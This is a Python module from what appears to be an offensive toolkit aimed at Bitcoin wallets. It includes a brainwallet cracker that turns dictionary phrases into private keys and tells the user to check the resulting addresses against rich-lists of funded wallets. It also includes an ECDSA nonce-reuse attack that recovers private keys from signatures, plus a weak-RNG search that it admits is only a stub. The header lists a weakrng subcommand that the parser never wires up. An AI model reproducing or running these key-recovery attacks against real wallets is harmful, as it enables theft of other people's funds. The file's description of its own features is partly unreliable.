# language: Python, file: Program/crypto/wallet.py, target: Red Sky crypto — wallet attack surface
# Subcommands:
#   entropy   -- score a BIP39 seed phrase against the wordlist, count entropy,
#                detect common weak patterns (repeated words, dictionary phrases)
#   derive    -- BIP32/BIP39/BIP44 derivation from a mnemonic or seed hex, dumps
#                every address for a range of accounts/change/indexes
#   brainwallet -- dictionary + rule attack on brainwallets (SHA256(passphrase)
#                  -> private key -> address)
#   reuse     -- ECDSA nonce reuse against a list of raw (r,s,z) signatures
#                pulled from a chain, recovers the private key
#   weakrng   -- brute keys from known Android SecureRandom bug (2013): the
#                vulnerable range of PRNG seeds -> private key -> address
# Uses pure-Python secp256k1 + BIP39 + BIP32. No external crypto deps except
# hashlib (stdlib) and an optional `ecdsa` accelerator if present.

import hashlib
import hmac
import json
import struct
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


CRYPTO_DIR = OUTPUT_DIR / "crypto"
WALLET_DIR = CRYPTO_DIR / "wallet"
WALLET_DIR.mkdir(parents=True, exist_ok=True)


# ── secp256k1 curve params ──
P  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
N  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8


def _inv(a: int, m: int) -> int:
    return pow(a, -1, m)


def _point_add(p1: Optional[Tuple[int, int]], p2: Optional[Tuple[int, int]]) -> Optional[Tuple[int, int]]:
    if p1 is None:
        return p2
    if p2 is None:
        return p1
    x1, y1 = p1
    x2, y2 = p2
    if x1 == x2 and (y1 + y2) % P == 0:
        return None
    if x1 == x2 and y1 == y2:
        m = (3 * x1 * x1) * _inv(2 * y1, P) % P
    else:
        m = (y2 - y1) * _inv(x2 - x1, P) % P
    x3 = (m * m - x1 - x2) % P
    y3 = (m * (x1 - x3) - y1) % P
    return (x3, y3)


def _scalar_mul(k: int, pt: Tuple[int, int]) -> Optional[Tuple[int, int]]:
    result = None
    addend = pt
    while k:
        if k & 1:
            result = _point_add(result, addend)
        addend = _point_add(addend, addend)
        k >>= 1
    return result


def _pubkey_from_priv(priv_int: int) -> bytes:
    """Return the 33-byte compressed secp256k1 public key for a private key."""
    pt = _scalar_mul(priv_int, (Gx, Gy))
    if pt is None:
        return b""
    x, y = pt
    prefix = 0x02 if (y & 1) == 0 else 0x03
    return bytes([prefix]) + x.to_bytes(32, "big")


# ── hashing / encoding ──
def _sha256(b: bytes) -> bytes:
    return hashlib.sha256(b).digest()


def _hash160(b: bytes) -> bytes:
    return hashlib.new("ripemd160", _sha256(b)).digest()


def _sha512(b: bytes) -> bytes:
    return hashlib.sha512(b).digest()


B58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"


def b58check_encode(payload: bytes) -> str:
    checksum = _sha256(_sha256(payload))[:4]
    data = payload + checksum
    n = int.from_bytes(data, "big")
    out = ""
    while n:
        n, r = divmod(n, 58)
        out = B58_ALPHABET[r] + out
    # leading zeros
    for b in data:
        if b == 0:
            out = "1" + out
        else:
            break
    return out


def btc_p2pkh_address(priv_int: int) -> str:
    """Return the legacy (P2PKH) Bitcoin address for a private key."""
    pub = _pubkey_from_priv(priv_int)
    h = _hash160(pub)
    payload = b"\x00" + h
    return b58check_encode(payload)


def btc_p2wpkh_address(priv_int: int) -> str:
    """Return the native SegWit (bech32 P2WPKH) Bitcoin address for a key."""
    pub = _pubkey_from_priv(priv_int)
    h = _hash160(pub)
    # bech32 encode with HRP "bc" and witness version 0
    return _bech32_encode("bc", 0, h)


def _bech32_polymod(values):
    CHK = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3]
    chk = 1
    for v in values:
        top = chk >> 25
        chk = ((chk & 0x1ffffff) << 5) ^ v
        for i in range(5):
            if (top >> i) & 1:
                chk ^= CHK[i]
    return chk


def _bech32_hrp_expand(hrp):
    return [ord(x) >> 5 for x in hrp] + [0] + [ord(x) & 31 for x in hrp]


def _bech32_create_checksum(hrp, data):
    values = _bech32_hrp_expand(hrp) + data
    polymod = _bech32_polymod(values + [0, 0, 0, 0, 0, 0]) ^ 1
    return [(polymod >> 5 * (5 - i)) & 31 for i in range(6)]


def _bech32_encode(hrp, witver, witprog):
    data = [witver] + _convertbits(witprog, 8, 5)
    combined = data + _bech32_create_checksum(hrp, data)
    return hrp + "1" + "".join(BECH32_CHARS[d] for d in combined)


BECH32_CHARS = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"


def _convertbits(data, frombits, tobits, pad=True):
    acc = 0
    bits = 0
    ret = []
    maxv = (1 << tobits) - 1
    for b in data:
        acc = (acc << frombits) | b
        bits += frombits
        while bits >= tobits:
            bits -= tobits
            ret.append((acc >> bits) & maxv)
    if pad and bits:
        ret.append((acc << (tobits - bits)) & maxv)
    return ret


# ── BIP39 ──
BIP39_WORDLIST_URL = "https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt"
BIP39_CACHE = WALLET_DIR / "bip39_english.txt"


def _load_bip39() -> Optional[List[str]]:
    if BIP39_CACHE.exists():
        return BIP39_CACHE.read_text().splitlines()
    try:
        import requests
        print_info("downloading BIP39 wordlist (once)")
        r = requests.get(BIP39_WORDLIST_URL, timeout=20)
        if r.status_code == 200:
            BIP39_CACHE.write_text(r.text)
            return r.text.splitlines()
    except Exception as e:
        print_warn("could not fetch BIP39 wordlist: " + str(e))
    # small fallback — first 256 words (for tests only)
    return None


def mnemonic_to_seed(mnemonic: str, passphrase: str = "") -> bytes:
    """BIP39 mnemonic -> 64-byte seed (PBKDF2-HMAC-SHA512)."""
    mnemonic_nfkd = mnemonic.strip()
    salt = ("mnemonic" + passphrase).encode()
    return hashlib.pbkdf2_hmac("sha512", mnemonic_nfkd.encode(), salt, 2048, 64)


# ── BIP32 ──
def bip32_master(seed: bytes) -> Tuple[bytes, bytes]:
    """Returns (private_key, chain_code)."""
    I = hmac.new(b"Bitcoin seed", seed, hashlib.sha512).digest()
    return I[:32], I[32:]


def bip32_ckd_priv(k_par: bytes, c_par: bytes, index: int) -> Tuple[bytes, bytes]:
    if index & 0x80000000:
        data = b"\x00" + k_par + struct.pack(">I", index)
    else:
        pub = _pubkey_from_priv(int.from_bytes(k_par, "big"))
        data = pub + struct.pack(">I", index)
    I = hmac.new(c_par, data, hashlib.sha512).digest()
    ki = (int.from_bytes(I[:32], "big") + int.from_bytes(k_par, "big")) % N
    return ki.to_bytes(32, "big"), I[32:]


def bip32_derive_path(seed: bytes, path: str) -> bytes:
    """Derive a private key from a BIP32 path like m/44'/0'/0'/0/0."""
    k, c = bip32_master(seed)
    for part in path.split("/")[1:]:
        hardened = part.endswith("'")
        idx = int(part.rstrip("'"))
        if hardened:
            idx |= 0x80000000
        k, c = bip32_ckd_priv(k, c, idx)
    return k


# ── brainwallet crack ──
def brainwallet_key(passphrase: str) -> int:
    """Classic brainwallet: SHA256(passphrase) -> private key."""
    return int.from_bytes(_sha256(passphrase.encode()), "big") % N


# ── weak RNG (Android SecureRandom 2013) ──
# The Android SecureRandom bug (CVE-2013-7372) made Bitcoin wallets reuse a
# PRNG state across apps. The 2013 scan recovered ~55 BTC. The attack: keys
# were derived from OpenSSL PRNG seeded with the same state; brute the first
# few bytes. This stub shows the shape — real recovery needs the OpenSSL
# PRNG model and the collected key set.
def android_weak_rng_search(base_seed: int, range_: int) -> List[Tuple[int, str]]:
    hits = []
    for offset in range(range_):
        seed = base_seed + offset
        priv = int.from_bytes(_sha256(seed.to_bytes(8, "big")), "big") % N
        addr = btc_p2pkh_address(priv)
        hits.append((offset, addr))
    return hits


# ── commands ──
def cmd_entropy(mnemonic: str, out_file: str) -> int:
    words = mnemonic.strip().split()
    print_info("BIP39 entropy check")
    print_kv("words", len(words))
    print()

    wordlist = _load_bip39()
    if not wordlist:
        print_warn("no wordlist — only counting words")
    else:
        wl_set = set(wordlist)
        unknown = [w for w in words if w not in wl_set]
        print_kv("all in wordlist", "yes" if not unknown else "no (" + str(len(unknown)) + " unknown)")
        if unknown:
            print_info("unknown words: " + ", ".join(unknown[:5]))
        # valid word counts
        valid = {12, 15, 18, 21, 24}
        print_kv("valid length", "yes" if len(words) in valid else "no")

    # entropy estimation
    if len(words) in (12, 24):
        entropy_bits = len(words) * 32 // 3  # 12->128, 24->256
        print_kv("nominal entropy", str(entropy_bits) + " bits")
        # reduce for duplicates
        unique = len(set(words))
        if unique < len(words):
            print_warn("contains repeated words (" + str(len(words) - unique) + " dupes) — lower entropy")
        # dictionary-word check
        common_weak = {"abandon", "about", "above", "absent", "absurd", "zoo", "zero",
                       "alpha", "beta", "apple", "banana", "orange", "test", "hello",
                       "world", "first", "second", "third"}
        weak = [w for w in words if w in common_weak]
        if weak:
            print_warn("suspiciously common words: " + ", ".join(weak))

    out = Path(out_file) if out_file else WALLET_DIR / ("entropy_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps({"words": words, "word_count": len(words)}, indent=2))
    print_kv("saved", out)
    return 0


def cmd_derive(mnemonic: str, seed_hex: str, path: str, accounts: int,
               out_file: str) -> int:
    if mnemonic:
        seed = mnemonic_to_seed(mnemonic)
        print_info("derived BIP39 seed from mnemonic")
    elif seed_hex:
        seed = bytes.fromhex(seed_hex)
        print_info("using raw seed hex")
    else:
        print_err("provide --mnemonic or --seed-hex")
        return 2

    print_kv("seed bytes", len(seed))
    print()

    # if a full path is given, derive just that
    if path:
        k = bip32_derive_path(seed, path)
        priv = int.from_bytes(k, "big")
        addr_p2pkh = btc_p2pkh_address(priv)
        addr_p2wpkh = btc_p2wpkh_address(priv)
        print(BOLD + path + RESET)
        print("  " + ASH + "priv hex:  " + RESET + BONE + k.hex() + RESET)
        print("  " + ASH + "p2pkh:     " + RESET + SCARLET + addr_p2pkh + RESET)
        print("  " + ASH + "p2wpkh:    " + RESET + SCARLET + addr_p2wpkh + RESET)
    else:
        # default: bip44 for BTC — m/44'/0'/account'/change/index
        results = []
        for acct in range(accounts):
            for change in (0, 1):
                for idx in range(5):
                    p = "m/44'/0'/" + str(acct) + "'/" + str(change) + "/" + str(idx)
                    k = bip32_derive_path(seed, p)
                    priv = int.from_bytes(k, "big")
                    addr = btc_p2pkh_address(priv)
                    print(BONE + p.ljust(24) + RESET
                          + ARTERY + addr + RESET
                          + "  " + ASH + k.hex()[:16] + "..." + RESET)
                    results.append({"path": p, "address": addr, "priv_hex": k.hex()})

        out = Path(out_file) if out_file else WALLET_DIR / ("derive_" + str(int(time.time())) + ".json")
        out.write_text(json.dumps(results, indent=2))
        print()
        print_kv("saved", out)
        return 0

    return 0


def cmd_brainwallet(wordlist: str, out_file: str) -> int:
    p = Path(wordlist).expanduser()
    if not p.exists():
        print_err("wordlist not found: " + str(p))
        return 1

    lines = [l.strip() for l in p.read_text().splitlines() if l.strip()]
    print_info("brainwallet crack")
    print_kv("candidates", len(lines))
    print()

    hits = []
    t0 = time.time()
    for i, phrase in enumerate(lines, 1):
        if i % 500 == 0:
            print("  " + ASH + str(i) + "/" + str(len(lines)) + RESET, end="\r")
        priv = brainwallet_key(phrase)
        addr = btc_p2pkh_address(priv)
        # we just print the address; checking against a known-rich list is separate
        hits.append({"phrase": phrase, "priv_hex": priv.to_bytes(32, "big").hex(), "address": addr})

    print()
    print_kv("elapsed", "{:.1f}s".format(time.time() - t0))
    print_kv("keys generated", len(hits))

    out = Path(out_file) if out_file else WALLET_DIR / ("brainwallet_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps(hits, indent=2))
    print_kv("saved", out)
    print()
    print_info("cross-reference these addresses against a rich-list (blockchair dumps or similar)")
    return 0


def cmd_reuse(json_path: str, out_file: str) -> int:
    data = _load_json(json_path)
    if not data:
        return 1
    sigs = data.get("signatures", [])
    curve_n = int(data.get("order", 0)) or N

    print_info("ECDSA nonce reuse across " + str(len(sigs)) + " signatures")

    # group by r — reuse means two sigs share the same r
    by_r: Dict[int, List[Dict]] = {}
    for s in sigs:
        by_r.setdefault(int(s["r"]), []).append(s)

    hits = []
    for r, group in by_r.items():
        if len(group) < 2:
            continue
        s1, s2 = group[0], group[1]
        try:
            k = ((int(s1["z"]) - int(s2["z"])) * pow(int(s1["s"]) - int(s2["s"]), -1, curve_n)) % curve_n
            d = ((int(s1["s"]) * k - int(s1["z"])) * pow(r, -1, curve_n)) % curve_n
            hits.append({"r": hex(r), "k": hex(k), "d": hex(d)})
            print(SCARLET + "▓ " + RESET + "r = " + hex(r)[:32] + "...")
            print("  " + ASH + "k: " + RESET + hex(k))
            print("  " + ASH + "d: " + RESET + BONE + hex(d) + RESET)
        except ValueError:
            print_warn("inverse failed for r=" + hex(r)[:32])

    out = Path(out_file) if out_file else WALLET_DIR / ("reuse_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps(hits, indent=2))
    print()
    print_kv("hits", len(hits))
    print_kv("saved", out)
    return 0


def _load_json(path: str) -> Optional[Dict]:
    p = Path(path).expanduser()
    if not p.exists():
        print_err("not found: " + str(p))
        return None
    try:
        return json.loads(p.read_text())
    except json.JSONDecodeError as e:
        print_err("bad json: " + str(e))
        return None


def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky crypto wallet", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="help",
                   choices=["entropy", "derive", "brainwallet", "reuse", "help"])
    p.add_argument("--mnemonic", default="")
    p.add_argument("--seed-hex", default="")
    p.add_argument("--path", default="")
    p.add_argument("--accounts", type=int, default=3)
    p.add_argument("--wordlist", default="")
    p.add_argument("--in", dest="infile", default="")
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky crypto wallet <entropy|derive|brainwallet|reuse> [opts]")
        return 2

    if ns.action == "help" or ns.help:
        print_info("entropy --mnemonic 'word1 word2 ...'       -- score a BIP39 phrase")
        print_info("derive --mnemonic '...' [--path m/44'/0'/0'/0/0]")
        print_info("derive --seed-hex abcd... [--accounts 3]   -- dump P2PKH + P2WPKH")
        print_info("brainwallet --wordlist phrases.txt         -- SHA256(passphrase) brainwallet")
        print_info("reuse --in sigs.json                       -- ECDSA nonce reuse")
        return 0

    if ns.action == "entropy":
        if not ns.mnemonic:
            print_err("--mnemonic required")
            return 2
        return cmd_entropy(ns.mnemonic, ns.out)
    if ns.action == "derive":
        return cmd_derive(ns.mnemonic, ns.seed_hex, ns.path, ns.accounts, ns.out)
    if ns.action == "brainwallet":
        if not ns.wordlist:
            print_err("--wordlist required")
            return 2
        return cmd_brainwallet(ns.wordlist, ns.out)
    if ns.action == "reuse":
        if not ns.infile:
            print_err("--in required")
            return 2
        return cmd_reuse(ns.infile, ns.out)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
